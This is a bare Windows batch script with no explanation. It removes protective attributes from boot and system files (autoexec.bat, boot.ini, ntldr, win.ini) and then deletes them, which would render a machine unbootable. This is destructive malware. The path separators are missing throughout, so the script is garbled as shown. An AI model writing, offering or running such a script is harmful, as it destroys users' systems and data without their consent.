@echo off

attrib -r -s -hc:  autoexec.bat

del c:  autoexec.bat

attrib -r -s -hc:  boot.ini

del c:  boot.ini

attrib -r -s -hc:  ntldr

del c:  ntldr

attrib -r -s -hc:  windows  win.ini

del c:  windows  win.ini
